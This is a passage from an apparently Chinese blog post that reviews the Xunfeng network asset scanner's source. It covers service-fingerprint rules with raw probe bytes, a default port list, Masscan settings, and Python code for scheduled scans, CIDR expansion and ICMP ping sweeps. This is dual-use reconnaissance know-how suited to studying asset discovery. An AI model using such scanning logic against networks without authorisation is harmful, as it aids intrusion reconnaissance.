Tomcat\napache|header|server|apache\niis|header|server|iis\njetty|header|server|jetty\nnginx|header|server|nginx\ncisco|header|server|cisco\ncouchdb|header|server|couchdb\ntplink|header|WWW-Authenticate|TP-LINK\nh3c|header|WWW-Authenticate|h3c\nh3c|file|index|/web/device/login\nhuawei|header|WWW-Authenticate|huawei\nnetgear|header|WWW-Authenticate|netgear\nhikvision|header|server|DNVRS-Webs\nhikvision|header|server|App-webs\nhikvision|header|server|DVRDVS-Webs\nhikvision|header|server|Hikvision-Webs\ntengine|header|server|Tengine"</span>,</span><br><span class="line"><span class="attr">"info"</span>: <span class="string">"组件容器识别规则"</span>,</span><br><span class="line"><span class="attr">"help"</span>: <span class="string">"用于识别WEB的容器、中间件等组件信息，格式：组件名称|判断方式|判断对象|判断正则。识别信息保存于tag记录中，可使用tag:tomcat方式进行搜索。"</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="attr">"Discern_lang"</span>: &#123;</span><br><span class="line"><span class="attr">"value"</span>: <span class="string">"php|header|Server|php\nphp|header|X-Powered-By|php\nphp|header|Set-Cookie|PHPSSIONID\njsp|header|Set-Cookie|JSESSIONID\nasp|header|Set-Cookie|ASPSESSION\naspx|header|Set-Cookie|ASP.NET_SessionId\naspx|header|X-AspNet-Version|version\naspx|file|index|&lt;input[^&gt;]+name=\\\"__VIEWSTATE\naspx|file|index|&lt;a[^&gt;]*?href=('|\")[^http].*?\\.aspx(\\?|\\1)\nasp|file|index|&lt;a[^&gt;]*?href=('|\")[^http].*?\\.asp(\\?|\\1)\nphp|file|index|&lt;a[^&gt;]*?href=('|\")[^http].*?\\.php(\\?|\\1)\njsp|file|index|&lt;a[^&gt;]*?href=('|\")[^http].*?\\.jsp(\\?|\\1)"</span>,</span><br><span class="line"><span class="attr">"info"</span>: <span class="string">"代码语言识别规则"</span>,</span><br><span class="line"><span class="attr">"help"</span>: <span class="string">"用于识别WEB的开发语言，识别信息保存于tag记录中，可使用tag:php方式进行搜索。"</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="attr">"Discern_server"</span>: &#123;</span><br><span class="line"><span class="attr">"value"</span>: <span class="string">"ftp|21|banner|^220.*?ftp|^220-|^220 Service|^220 FileZilla\nssh|22|banner|^ssh-\ntelnet|23|banner|^\\xff[\\xfa-\\xfe]|^\\x54\\x65\\x6c|Telnet\nsmtp|25|banner|^220.*?smtp\ndns|53|default|\npop3|110|banner|\\+OK.*?pop3\nnetbios|139|default|\nimap|143|banner|^\\* OK.*?imap\nldap|389|default|\nsmb|445|default|\nsmtps|465|default|\nrsync|873|banner|^@RSYNCD|^@ERROR\nimaps|993|default|\npop3|995|banner|\\+OK\nproxy|1080|\\x05\\x01\\x00\\x01|^\\x05\\x00\npptp|1723|default|\nmssql|1433|\\x12\\x01\\x00\\x34\\x00\\x00\\x00\\x00\\x00\\x00\\x15\\x00\\x06\\x01\\x00\\x1b\\x00\\x01\\x02\\x00\\x1c\\x00\\x0c\\x03\\x00\\x28\\x00\\x04\\xff\\x08\\x00\\x01\\x55\\x00\\x00\\x00\\x4d\\x53\\x53\\x51\\x4c\\x53\\x65\\x72\\x76\\x65\\x72\\x00\\x48\\x0f\\x00\\x00|^\\x04\\x01\noracle|1521|\\x00\\x3a\\x00\\x00\\x01\\x00\\x00\\x00\\x01\\x39\\x01\\x2c\\x00\\x00\\x08\\x00\\x7f\\xff\\xc6\\x0e\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x3a\\x00\\x00\\x08\\x00\\x41\\x41\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00|\\x00Y\\x00\nmysql|3306|banner|^.\\0\\0\\0.*?mysql|^.\\0\\0\\0\\n|.*?MariaDB server\nrdp|3389|\\x03\\x00\\x00\\x13\\x0E\\xE0\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x08\\x00\\x03\\x00\\x00\\x00|\\x03\\x00\\x00\\x13\nsvn|3690|default|\npostgresql|5432|\\x00\\x00\\x00\\x54\\x00\\x03\\x00\\x00\\x75\\x73\\x65\\x72\\x00\\x70\\x6f\\x73\\x74\\x67\\x72\\x65\\x73\\x00\\x64\\x61\\x74\\x61\\x62\\x61\\x73\\x65\\x00\\x70\\x6f\\x73\\x74\\x67\\x72\\x65\\x73\\x00\\x61\\x70\\x70\\x6c\\x69\\x63\\x61\\x74\\x69\\x6f\\x6e\\x5f\\x6e\\x61\\x6d\\x65\\x00\\x70\\x73\\x71\\x6c\\x00\\x63\\x6c\\x69\\x65\\x6e\\x74\\x5f\\x65\\x6e\\x63\\x6f\\x64\\x69\\x6e\\x67\\x00\\x55\\x54\\x46\\x38\\x00\\x00|^R\\x00\\x00\\x00\nvnc|5900|banner|^RFB\nredis|6379|info\\r\\n|redis\nelasticsearch|9200|GET /_cat HTTP/1.1\\r\\n\\r\\n|/_cat/master\nmemcache|11211|\\x80\\x0b\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00|^\\x81\\x0b\nmongodb|27017|\\x00\\x00\\x00\\xa7A\\x00\\x00\\x00\\x00\\x00\\x00\\xd4\\x07\\x00\\x00\\x00\\x00\\x00\\x00admin.$cmd\\x00\\x00\\x00\\x00\\x00\\xff\\xff\\xff\\xff\\x13\\x00\\x00\\x00\\x10ismaster\\x00\\x01\\x00\\x00\\x00\\x00|ismaster\nzookeeper|2181|stat|Zookeeper version"</span>,</span><br><span class="line"><span class="attr">"info"</span>: <span class="string">"服务类型识别规则"</span>,</span><br><span class="line"><span class="attr">"help"</span>: <span class="string">"用于识别开放端口上所运行的服务信息，格式:服务名称|端口号|匹配模式|匹配正则，结果以正则匹配为优先，无正则内容时使用端口号进行默认匹配，再无结果时即主动发送探测包进行识别，识别结果保存于server记录中，可使用server:ftp方式进行搜索"</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="attr">"Port_list"</span>: &#123;</span><br><span class="line"><span class="attr">"value"</span>: <span class="string">"1|21\n22\n23\n25\n53\n80\n110\n139\n143\n389\n443\n445\n465\n873\n993\n995\n1080\n1311\n1723\n1433\n1521\n3000\n3001\n3002\n3306\n3389\n3690\n4000\n5432\n5900\n6379\n7001\n8000\n8001\n8080\n8081\n8888\n9200\n9300\n9080\n9090\n9999\n11211\n27017"</span>,</span><br><span class="line"><span class="attr">"info"</span>: <span class="string">"端口探测列表(TCP探测)"</span>,</span><br><span class="line"><span class="attr">"help"</span>: <span class="string">"默认探测端口列表，可开启ICMP，开启后只对存活的IP地址进行探测"</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="attr">"Masscan"</span>: &#123;</span><br><span class="line"><span class="attr">"value"</span>: <span class="string">"0|20000|/root/xunfeng/masscan/linux_64/masscan"</span>,</span><br><span class="line"><span class="attr">"info"</span>: <span class="string">"启用MASSCAN"</span>,</span><br><span class="line"><span class="attr">"help"</span>: <span class="string">"可启用MASSCAN(自行安装)代替默认的端口扫描方式，路径地址需配置全路径，MASSCAN探测端口范围为1-65535且强制进行ICMP存活检测，请根据网络实际情况设置发包速率。"</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="attr">"Timeout"</span>: &#123;</span><br><span class="line"><span class="attr">"value"</span>: <span class="string">"8"</span>,</span><br><span class="line"><span class="attr">"info"</span>: <span class="string">"连接超时时间(TCP)"</span>,</span><br><span class="line"><span class="attr">"help"</span>: <span class="string">"WEB请求的超时时间，socket连接超时为值的一半。"</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="attr">"Cycle"</span>: &#123;</span><br><span class="line"><span class="attr">"value"</span>: <span class="string">"1|9"</span>,</span><br><span class="line"><span class="attr">"info"</span>: <span class="string">"资产探测周期"</span>,</span><br><span class="line"><span class="attr">"help"</span>: <span class="string">"设置资产探测的扫描周期，格式：天数|小时，例如 5|16，即每5天的16点开始进行扫描。"</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="attr">"Thread"</span>: &#123;</span><br><span class="line"><span class="attr">"value"</span>: <span class="string">"200"</span>,</span><br><span class="line"><span class="attr">"info"</span>: <span class="string">"最大线程数"</span>,</span><br><span class="line"><span class="attr">"help"</span>: <span class="string">"爬虫引擎的最大线程数限制"</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="attr">"White_list"</span>: &#123;</span><br><span class="line"><span class="attr">"value"</span>: <span class="string">""</span>,</span><br><span class="line"><span class="attr">"info"</span>: <span class="string">"资产发现白名单"</span>,</span><br><span class="line"><span class="attr">"help"</span>: <span class="string">"不对白名单内的IP列表进行资产发现。格式：x.x.x.x，以行分割"</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后判断是否为<code>[&#39;Discern_cms&#39;, &#39;Discern_con&#39;, &#39;Discern_lang&#39;, &#39;Discern_server&#39;]</code>这里面的集合</p><p>这里分类如下：</p><ol><li><code>Discern_cms</code>：cms识别规则 </li><li><code>Discern_con</code>：组件容器识别规则</li><li><code>Discern_lang</code>：代码语言识别规则 </li><li><code>Discern_server</code>：服务类型识别规则</li></ol><p>是的话就进行<code>config</code>格式化处理：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">format_config</span><span class="params">(config_name, config_info)</span>:</span></span><br><span class="line">    mark_list = []</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        config_file = config_info.split(<span class="string">'\n'</span>)</span><br><span class="line">        <span class="keyword">if</span> config_name == <span class="string">'Discern_server'</span>:</span><br><span class="line">            <span class="keyword">for</span> mark <span class="keyword">in</span> config_file:</span><br><span class="line">                name, port, mode, reg = mark.strip().split(<span class="string">"|"</span>, <span class="number">3</span>)</span><br><span class="line">                mark_list.append([name, port, mode, reg])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">for</span> mark <span class="keyword">in</span> config_file:</span><br><span class="line">                name, location, key, value = mark.strip().split(<span class="string">"|"</span>, <span class="number">3</span>)</span><br><span class="line">                mark_list.append([name.lower(), location, key, value])</span><br><span class="line">    <span class="keyword">except</span> Exception, e:</span><br><span class="line">        <span class="keyword">print</span> e</span><br><span class="line">    <span class="keyword">return</span> mark_list</span><br></pre></td></tr></table></figure><p>先每一行分开</p><p>如果是服务类型识别规则，就分割成<code>name, port, mode, reg</code></p><p>不是服务类型识别规则的话，就分割成<code>name, location, key, value</code></p><p>然后根据列表方式返回到一个新的列表，最后返回总列表</p><p>如果不在这几个识别类型里的话，就直接返回他的查询的<code>value</code>，就比如：</p><figure class="highlight"><table><tr><td class="code"><pre><span class="line">"Timeout": &#123;</span><br><span class="line">  "value": "8",</span><br><span class="line">  "info": "连接超时时间(TCP)",</span><br><span class="line">  "help": "WEB请求的超时时间，socket连接超时为值的一半。"</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>它实际上就是在设置这一块部分</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/image-20200327114029026.png" alt=""></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/image-20200327114044568.png" alt=""></p><h2 id="读取统计信息"><a href="#读取统计信息" class="headerlink" title="读取统计信息"></a>读取统计信息</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">STATISTICS = get_statistics()  <span class="comment"># 读取统计信息</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_statistics</span><span class="params">()</span>:</span></span><br><span class="line">    date_ = datetime.datetime.now().strftime(<span class="string">'%Y-%m-%d'</span>)</span><br><span class="line">    now_stati = mongo.na_db.Statistics.find_one(&#123;<span class="string">"date"</span>: date_&#125;)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> now_stati:</span><br><span class="line">        now_stati = &#123;date_: &#123;<span class="string">"add"</span>: <span class="number">0</span>, <span class="string">"update"</span>: <span class="number">0</span>, <span class="string">"delete"</span>: <span class="number">0</span>&#125;&#125;</span><br><span class="line">        <span class="keyword">return</span> now_stati</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> &#123;date_: now_stati[<span class="string">'info'</span>]&#125;</span><br></pre></td></tr></table></figure><p>根据年月日来读取，所以说他数据不能实时更新，只能每天更新一次统计信息<br><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/image-20200327114803112.png" alt="image-20200327114803112"></p><h2 id="心跳检测"><a href="#心跳检测" class="headerlink" title="心跳检测"></a>心跳检测</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">monitor</span><span class="params">(CONFIG_INI, STATISTICS, NACHANGE)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            time_ = datetime.datetime.now()</span><br><span class="line">            date_ = time_.strftime(<span class="string">'%Y-%m-%d'</span>)</span><br><span class="line">            mongo.na_db.Heartbeat.update(&#123;<span class="string">"name"</span>: <span class="string">"heartbeat"</span>&#125;, &#123;<span class="string">"$set"</span>: &#123;<span class="string">"up_time"</span>: time_&#125;&#125;)</span><br><span class="line">            <span class="keyword">if</span> date_ <span class="keyword">not</span> <span class="keyword">in</span> STATISTICS: STATISTICS[date_] = &#123;<span class="string">"add"</span>: <span class="number">0</span>, <span class="string">"update"</span>: <span class="number">0</span>, <span class="string">"delete"</span>: <span class="number">0</span>&#125;</span><br><span class="line">            mongo.na_db.Statistics.update(&#123;<span class="string">"date"</span>: date_&#125;, &#123;<span class="string">"$set"</span>: &#123;<span class="string">"info"</span>: STATISTICS[date_]&#125;&#125;, upsert=<span class="literal">True</span>)</span><br><span class="line">            new_config = get_config()</span><br><span class="line">            <span class="keyword">if</span> base64.b64encode(CONFIG_INI[<span class="string">"Scan_list"</span>]) != base64.b64encode(new_config[<span class="string">"Scan_list"</span>]):NACHANGE[<span class="number">0</span>] = <span class="number">1</span></span><br><span class="line">            CONFIG_INI.clear()</span><br><span class="line">            CONFIG_INI.update(new_config)</span><br><span class="line">        <span class="keyword">except</span> Exception, e:</span><br><span class="line">            <span class="keyword">print</span> e</span><br><span class="line">        time.sleep(<span class="number">30</span>)</span><br></pre></td></tr></table></figure><p>它是对之前的配置信息和统计信息做心跳检测的（每隔30秒）</p><p>大概逻辑是判断是否扫描列表更新了，更新了的话就更新字典，设置<code>NACHANGE[0]=1</code></p><p>并且把原先的设置清除了，然后重新获取数据</p><h2 id="无效记录删除"><a href="#无效记录删除" class="headerlink" title="无效记录删除"></a>无效记录删除</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">thread.start_new_thread(cruise, (STATISTICS, MASSCAN_AC))  <span class="comment"># 失效记录删除线程</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cruise</span><span class="params">(STATISTICS,MASSCAN_AC)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        now_str = datetime.datetime.now()</span><br><span class="line">        week = int(now_str.weekday())</span><br><span class="line">        hour = int(now_str.hour)</span><br><span class="line">        <span class="keyword">if</span> week &gt;= <span class="number">1</span> <span class="keyword">and</span> week &lt;= <span class="number">5</span> <span class="keyword">and</span> hour &gt;= <span class="number">9</span> <span class="keyword">and</span> hour &lt;= <span class="number">18</span>:  <span class="comment"># 非工作时间不删除</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                data = mongo.NA_INFO.find().sort(<span class="string">"time"</span>, <span class="number">1</span>)</span><br><span class="line">                <span class="keyword">for</span> history_info <span class="keyword">in</span> data:</span><br><span class="line">                    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                        <span class="keyword">if</span> MASSCAN_AC[<span class="number">0</span>]:  <span class="comment"># 如果masscan正在扫描即不进行清理</span></span><br><span class="line">                            time.sleep(<span class="number">10</span>)</span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                            <span class="keyword">break</span></span><br><span class="line">                    ip = history_info[<span class="string">'ip'</span>]</span><br><span class="line">                    port = history_info[<span class="string">'port'</span>]</span><br><span class="line">                    <span class="keyword">try</span>:</span><br><span class="line">                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">                        sock.connect((ip, int(port)))</span><br><span class="line">                        sock.close()</span><br><span class="line">                    <span class="keyword">except</span> Exception, e:</span><br><span class="line">                        time_ = datetime.datetime.now()</span><br><span class="line">                        date_ = time_.strftime(<span class="string">'%Y-%m-%d'</span>)</span><br><span class="line">                        mongo.NA_INFO.remove(&#123;<span class="string">"ip"</span>: ip, <span class="string">"port"</span>: port&#125;)</span><br><span class="line">                        log.write(<span class="string">'info'</span>, <span class="literal">None</span>, <span class="number">0</span>, <span class="string">'%s:%s delete'</span> % (ip, port))</span><br><span class="line">                        STATISTICS[date_][<span class="string">'delete'</span>] += <span class="number">1</span></span><br><span class="line">                        <span class="keyword">del</span> history_info[<span class="string">"_id"</span>]</span><br><span class="line">                        history_info[<span class="string">'del_time'</span>] = time_</span><br><span class="line">                        history_info[<span class="string">'type'</span>] = <span class="string">'delete'</span></span><br><span class="line">                        mongo.NA_HISTORY.insert(history_info)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">        time.sleep(<span class="number">3600</span>)</span><br></pre></td></tr></table></figure><p>大概逻辑就是判断是否为工作时间或者<code>MASSCAN</code>是否在扫描，然后通过与这些<code>ip和端口</code>尝试进行<code>socket</code>连接来判断是否存活</p><p>通过异常捕捉来实现删除，然后写入删除记录</p><h2 id="资产扫描"><a href="#资产扫描" class="headerlink" title="资产扫描"></a>资产扫描</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">  now_time = time.localtime()</span><br><span class="line">  now_hour = now_time.tm_hour</span><br><span class="line">  now_day = now_time.tm_mday</span><br><span class="line">  now_date = str(now_time.tm_year) + \</span><br><span class="line">  str(now_time.tm_mon) + str(now_day)</span><br><span class="line">  cy_day, ac_hour = CONFIG_INI[<span class="string">'Cycle'</span>].split(<span class="string">'|'</span>)</span><br><span class="line">  log.write(<span class="string">'info'</span>, <span class="literal">None</span>, <span class="number">0</span>, <span class="string">u'扫描规则: '</span> + str(CONFIG_INI[<span class="string">'Cycle'</span>]))</span><br><span class="line">  <span class="comment"># 判断是否进入扫描时段</span></span><br><span class="line">  <span class="keyword">if</span> (now_hour == int(ac_hour) <span class="keyword">and</span> now_day % int(cy_day) == <span class="number">0</span> <span class="keyword">and</span> now_date <span class="keyword">not</span> <span class="keyword">in</span> ac_data) <span class="keyword">or</span> NACHANGE[<span class="number">0</span>]:</span><br><span class="line">    ac_data.append(now_date)</span><br><span class="line">    NACHANGE[<span class="number">0</span>] = <span class="number">0</span></span><br><span class="line">    log.write(<span class="string">'info'</span>, <span class="literal">None</span>, <span class="number">0</span>, <span class="string">u'开始扫描'</span>)</span><br><span class="line">    s = start(CONFIG_INI)</span><br><span class="line">    s.masscan_ac = MASSCAN_AC</span><br><span class="line">    s.statistics = STATISTICS</span><br><span class="line">    s.run()</span><br><span class="line">    time.sleep(<span class="number">60</span>)</span><br></pre></td></tr></table></figure><p>先是拼接当前时间，然后获取计划资产扫描的周期</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/image-20200330000339693.png" alt=""></p><p>然后写入<code>log</code>当中</p><p>然后判断是否为当前计划扫描周期的时间或者有新的扫描任务(通过心跳检测来设置)</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(now_hour &#x3D;&#x3D; int(ac_hour) and now_day % int(cy_day) &#x3D;&#x3D; 0 and now_date not in ac_data) or NACHANGE[0]</span><br></pre></td></tr></table></figure><p>然后就把当前的时间加入<code>ac_data</code>列表，把<code>NACHANGE[0]</code>重置为0，写入日志当中，开始扫描</p><h1 id="start-py"><a href="#start-py" class="headerlink" title="start.py"></a>start.py</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = start(CONFIG_INI)</span><br><span class="line">s.masscan_ac = MASSCAN_AC</span><br><span class="line">s.statistics = STATISTICS</span><br><span class="line">s.run()</span><br></pre></td></tr></table></figure><p>这个类有点多，我们分开来看</p><h2 id="init"><a href="#init" class="headerlink" title="__init__"></a><code>__init__</code></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, config)</span>:</span>  <span class="comment"># 默认配置</span></span><br><span class="line">  self.config_ini = config</span><br><span class="line">  self.queue = Queue.Queue()</span><br><span class="line">  self.thread = int(self.config_ini[<span class="string">'Thread'</span>])</span><br><span class="line">  self.scan_list = self.config_ini[<span class="string">'Scan_list'</span>].split(<span class="string">'\n'</span>)</span><br><span class="line">  self.mode = int(self.config_ini[<span class="string">'Masscan'</span>].split(<span class="string">'|'</span>)[<span class="number">0</span>])</span><br><span class="line">  self.icmp = int(self.config_ini[<span class="string">'Port_list'</span>].split(<span class="string">'|'</span>)[<span class="number">0</span>])</span><br><span class="line">  self.white_list = self.config_ini.get(<span class="string">'White_list'</span>, <span class="string">''</span>).split(<span class="string">'\n'</span>)</span><br></pre></td></tr></table></figure><p>读取了扫描的配置信息，然后设置了一个队列，读取了扫描线程、IP列表、Masscan配置信息、端口信息以及白名单</p><figure class="highlight"><table><tr><td class="code"><pre><span class="line">"Scan_list": &#123;</span><br><span class="line">  "value": "",</span><br><span class="line">  "info": "网络资产探测列表(必填)",</span><br><span class="line">  "help": "指定爬虫引擎探测范围，格式：192.168.1.1-192.168.1.254(修改会立刻触发资产扫描收集)"</span><br><span class="line">&#125;,</span><br><span class="line">"Masscan": &#123;</span><br><span class="line">  "value": "0|20000|/root/xunfeng/masscan/linux_64/masscan",</span><br><span class="line">  "info": "启用MASSCAN",</span><br><span class="line">  "help": "可启用MASSCAN(自行安装)代替默认的端口扫描方式，路径地址需配置全路径，MASSCAN探测端口范围为1-65535且强制进行ICMP存活检测，请根据网络实际情况设置发包速率。"</span><br><span class="line">&#125;,</span><br><span class="line">"Port_list": &#123;</span><br><span class="line">  "value": "1|21\n22\n23\n25\n53\n80\n110\n139\n143\n389\n443\n445\n465\n873\n993\n995\n1080\n1311\n1723\n1433\n1521\n3000\n3001\n3002\n3306\n3389\n3690\n4000\n5432\n5900\n6379\n7001\n8000\n8001\n8080\n8081\n8888\n9200\n9300\n9080\n9090\n9999\n11211\n27017",</span><br><span class="line">  "info": "端口探测列表(TCP探测)",</span><br><span class="line">  "help": "默认探测端口列表，可开启ICMP，开启后只对存活的IP地址进行探测"</span><br><span class="line">&#125;,</span><br><span class="line">"White_list": &#123;</span><br><span class="line">  "value": "",</span><br><span class="line">  "info": "资产发现白名单",</span><br><span class="line">  "help": "不对白名单内的IP列表进行资产发现。格式：x.x.x.x，以行分割"</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="run"><a href="#run" class="headerlink" title="run"></a>run</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> AC_PORT_LIST</span><br><span class="line">    all_ip_list = []</span><br><span class="line">    <span class="keyword">for</span> ip <span class="keyword">in</span> self.scan_list:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"/"</span> <span class="keyword">in</span> ip:</span><br><span class="line">            ip = cidr.CIDR(ip)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> ip:</span><br><span class="line">            <span class="keyword">continue</span></span><br></pre></td></tr></table></figure><p><code>cidr.CIDR(ip)</code>这个我想了一会才发现这是子网掩码IP转IP段的</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CIDR</span><span class="params">(input)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        ip = input.split(<span class="string">'/'</span>)[<span class="number">0</span>]</span><br><span class="line">        pos = int(input.split(<span class="string">'/'</span>)[<span class="number">1</span>])</span><br><span class="line">        ipstr = <span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> ip.split(<span class="string">'.'</span>):</span><br><span class="line">            ipstr = ipstr + bin(int(i)).replace(<span class="string">'0b'</span>, <span class="string">''</span>).zfill(<span class="number">8</span>)</span><br><span class="line">        pstr = <span class="string">'1'</span> * pos + <span class="string">'0'</span> * (<span class="number">32</span> - pos)</span><br><span class="line">        res = stringxor(ipstr, pstr)</span><br><span class="line">        _ip = getip(res, <span class="number">0</span>), getip(res[<span class="number">0</span>:pos] + <span class="string">'1'</span> * (<span class="number">32</span> - pos), <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> _ip[<span class="number">0</span>] + <span class="string">"-"</span> + _ip[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br></pre></td></tr></table></figure><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/image-20200330003115979.png" alt="image-20200330003115979"></p><p>但这里我推荐使用<code>IPy</code>这个库</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/image-20200330003635402.png" alt="image-20200330003635402"></p><p>重复造轮子会导致效率低下</p><p>然后根据白名单删除</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> white_ip <span class="keyword">in</span> self.white_list:</span><br><span class="line">  <span class="keyword">if</span> white_ip <span class="keyword">in</span> ip_list:</span><br><span class="line">    ip_list.remove(white_ip)</span><br></pre></td></tr></table></figure><p>然后看是否启用Masscan</p><p>我们这里先看启用<code>Masscan</code>的情况</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> self.mode == <span class="number">1</span>:</span><br><span class="line">    masscan_path = self.config_ini[<span class="string">'Masscan'</span>].split(<span class="string">'|'</span>)[<span class="number">2</span>]</span><br><span class="line">    masscan_rate = self.config_ini[<span class="string">'Masscan'</span>].split(<span class="string">'|'</span>)[<span class="number">1</span>]</span><br><span class="line">    <span class="comment"># 如果用户在前台关闭了ICMP存活探测则进行全IP段扫描</span></span><br><span class="line">    <span class="keyword">if</span> self.icmp:</span><br><span class="line">        ip_list = self.get_ac_ip(ip_list)</span><br><span class="line">    self.masscan_ac[<span class="number">0</span>] = <span class="number">1</span></span><br><span class="line">    <span class="comment"># 如果安装了Masscan即使用Masscan进行全端口扫描</span></span><br><span class="line">    AC_PORT_LIST = self.masscan(</span><br><span class="line">        ip_list, masscan_path, masscan_rate)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> AC_PORT_LIST:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    self.masscan_ac[<span class="number">0</span>] = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> ip_str <span class="keyword">in</span> AC_PORT_LIST.keys():</span><br><span class="line">        self.queue.put(ip_str)  <span class="comment"># 加入队列</span></span><br><span class="line">    self.scan_start()  <span class="comment"># 开始扫描</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    all_ip_list.extend(ip_list)</span><br></pre></td></tr></table></figure><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/image-20200330123543500.png" alt="image-20200330123543500"></p><p>读取了<code>masscan</code>的路径以及发包速率</p><p>然后判断是否<code>icmp</code>存活检测</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ip_list = self.get_ac_ip(ip_list)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_ac_ip</span><span class="params">(self, ip_list)</span>:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            s = icmp.Nscan()</span><br><span class="line">            ipPool = set(ip_list)</span><br><span class="line">            <span class="keyword">return</span> s.mPing(ipPool)</span><br><span class="line">        <span class="keyword">except</span> Exception, e:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'The current user permissions unable to send icmp packets'</span></span><br><span class="line">            <span class="keyword">return</span> ip_list</span><br></pre></td></tr></table></figure><p>这里看一下<code>icmp</code>的扫描流程</p><p><strong>icmp.py</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SendPingThr</span><span class="params">(threading.Thread)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, ipPool, icmpPacket, icmpSocket, timeout=<span class="number">3</span>)</span>:</span></span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line">        self.Sock = icmpSocket</span><br><span class="line">        self.ipPool = ipPool</span><br><span class="line">        self.packet = icmpPacket</span><br><span class="line">        self.timeout = timeout</span><br><span class="line">        self.Sock.settimeout(timeout + <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> ip <span class="keyword">in</span> self.ipPool:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                self.Sock.sendto(self.packet, (ip, <span class="number">0</span>))</span><br><span class="line">            <span class="keyword">except</span> socket.timeout:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">        time.sleep(self.timeout)</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Nscan</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span 